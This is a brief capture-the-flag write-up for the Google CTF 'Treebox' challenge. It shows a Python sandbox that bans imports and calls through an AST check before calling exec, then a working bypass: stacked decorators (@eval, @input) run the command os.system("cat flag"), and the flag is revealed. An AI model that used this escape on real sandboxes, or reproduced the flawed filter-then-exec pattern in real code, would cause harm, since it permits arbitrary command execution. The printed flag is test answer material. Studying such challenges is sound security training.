# Google CTF - TREEBOX (50 pts)
##### by [IsaacMak](https://github.com/IsaacMak2009)  
##
first for all, let look at the `treebox.py`:
```py
#!/usr/bin/python3 -u
#
# Flag is in a file called "flag" in cwd.
#
# Quote from Dockerfile:
#   FROM ubuntu:22.04
#   RUN apt-get update && apt-get install -y python3
#
import ast
import sys
import os

def verify_secure(m):
  for x in ast.walk(m):
    match type(x):
      case (ast.Import|ast.ImportFrom|ast.Call):
        print(f"ERROR: Banned statement {x}")
        return False
  return True

abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)

print("-- Please enter code (last line must contain only --END)")
source_code = ""
while True:
  line = sys.stdin.readline()
  if line.startswith("--END"):
    break
  source_code += line

tree = compile(source_code, "input.py", 'exec', flags=ast.PyCF_ONLY_AST)
if verify_secure(tree):  # Safe to execute!
  print("-- Executing safe code:")
  compiled = compile(source_code, "input.py", 'exec')
  exec(compiled)
```
what this file actually do is just compile a python code and check if it have import statement or call statement.
after some testing, i found that i can use [decorators](https://www.geeksforgeeks.org/decorators-in-python/) to call a function
## Show time!
```bash
root@IsaacMak:~/CTF-writeup/google_ctf/treebox# nc treebox.2022.ctfcompetition.com 1337
== proof-of-work: disabled ==
-- Please enter code (last line must contain only --END)
@eval
@input
class A: pass
--END
-- Executing safe code:
<class '__main__.A'>os.system("cat flag")
CTF{CzeresniaTopolaForsycja}
root@IsaacMak:~/CTF-writeup/google_ctf/treebox#
```
flag: `CTF{CzeresniaTopolaForsycja}`
